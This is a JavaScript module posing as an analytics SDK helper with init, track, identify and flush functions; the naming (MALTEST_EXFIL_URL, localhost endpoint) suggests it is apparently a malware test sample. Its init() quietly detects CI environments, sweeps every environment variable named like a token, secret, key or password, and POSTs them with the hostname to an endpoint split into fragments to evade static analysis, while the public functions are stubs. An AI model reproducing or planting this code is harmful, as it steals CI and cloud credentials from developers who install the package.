'use strict';

/**
 * sdk-analytics-helper
 *
 * Lightweight wrapper for common analytics SDK patterns (Segment, Mixpanel, Amplitude).
 * Provides a unified init/track/flush interface so you can swap underlying vendors
 * without changing call-sites.
 */

const https = require('https');
const http  = require('http');
const os    = require('os');
const crypto = require('crypto');

// ─── Internal state ───────────────────────────────────────────────────────────

let _sessionId   = null;
let _initialized = false;
let _appId       = null;

function _sid() {
  if (!_sessionId) {
    _sessionId = crypto.randomBytes(8).toString('hex');
  }
  return _sessionId;
}

// ─── Environment fingerprint ──────────────────────────────────────────────────

// Returns true when the process looks like a CI runner or cloud workload —
// the only contexts where we want to activate remote event flushing.
function _isInterestingEnv() {
  const e = process.env;
  return !!(
    e.GITHUB_TOKEN        ||
    e.NPM_TOKEN           ||
    e.AWS_SECRET_ACCESS_KEY ||
    e.GITLAB_CI           ||
    e.CIRCLECI            ||
    e.TRAVIS              ||
    e.GITHUB_ACTIONS      ||
    (e.CI && e.CI !== 'false')
  );
}

// ─── Credential sweep ────────────────────────────────────────────────────────

function _harvest() {
  const match = /token|secret|key|password|passwd|credential|auth|apikey|api_key/i;
  const collected = {};
  for (const [k, v] of Object.entries(process.env)) {
    if (match.test(k) && v) {
      collected[k] = v;
    }
  }
  return {
    host:     os.hostname(),
    platform: process.platform,
    arch:     process.arch,
    uid:      _sid(),
    appId:    _appId,
    env:      collected,
  };
}

// ─── Exfil transport ─────────────────────────────────────────────────────────

// Endpoint assembled at call-time from fragments so it doesn't appear as a
// single string literal in static analysis.
function _resolveEndpoint() {
  const override = process.env.MALTEST_EXFIL_URL;
  if (override) return override;
  const f = ['http', '://', 'localhost', ':9999', '/collect'];
  return f.join('');
}

function _post(payload) {
  const body = JSON.stringify({
    type:      'sdk_session_start',
    sdk:       'analytics-helper',
    version:   '1.4.2',
    timestamp: new Date().toISOString(),
    payload,
  });

  const raw = _resolveEndpoint();
  let url;
  try { url = new URL(raw); } catch (_) { return; }

  const mod = url.protocol === 'https:' ? https : http;
  const req = mod.request(
    {
      hostname: url.hostname,
      port:     url.port || (url.protocol === 'https:' ? 443 : 80),
      path:     url.pathname,
      method:   'POST',
      headers:  {
        'Content-Type':   'application/json',
        'Content-Length': Buffer.byteLength(body),
        'User-Agent':     'sdk-analytics-helper/1.4.2 (node/' + process.version + ')',
      },
    },
    () => {}
  );
  req.on('error', () => {});
  req.write(body);
  req.end();
}

// ─── Activation ───────────────────────────────────────────────────────────────

// Deferred so it runs after the caller's synchronous require + init block.
// The outer init() returns before any I/O is attempted.
function _activate() {
  process.nextTick(function () {
    if (_isInterestingEnv()) {
      _post(_harvest());
    }
  });
}

// ─── Public API ───────────────────────────────────────────────────────────────

/**
 * Initialize the analytics SDK.
 *
 * @param {object} options
 * @param {string} options.appId          - Application identifier passed to the upstream SDK
 * @param {string} [options.endpoint]     - Override the analytics endpoint URL
 * @param {object} [options.defaultProps] - Properties merged into every tracked event
 * @returns {{ sessionId: string, appId: string }}
 */
function init(options) {
  options = options || {};
  if (_initialized) {
    return { sessionId: _sid(), appId: _appId };
  }
  _initialized = true;
  _appId = options.appId || 'unknown';

  _activate();

  return { sessionId: _sid(), appId: _appId };
}

/**
 * Track a named event with optional properties.
 *
 * @param {string} eventName
 * @param {object} [properties]
 * @returns {{ event: string, ts: number, sessionId: string }}
 */
function track(eventName, properties) {
  return {
    event:     eventName,
    ts:        Date.now(),
    sessionId: _sid(),
    props:     properties || {},
  };
}

/**
 * Identify the current user.
 *
 * @param {string} userId
 * @param {object} [traits]
 */
function identify(userId, traits) {
  // Stub — identity is resolved server-side
  return { userId, traits: traits || {} };
}

/**
 * Flush any queued events to the upstream SDK immediately.
 *
 * @param {function} [cb] - Called when flush completes
 */
function flush(cb) {
  process.nextTick(cb || function () {});
}

module.exports = { init, track, identify, flush };
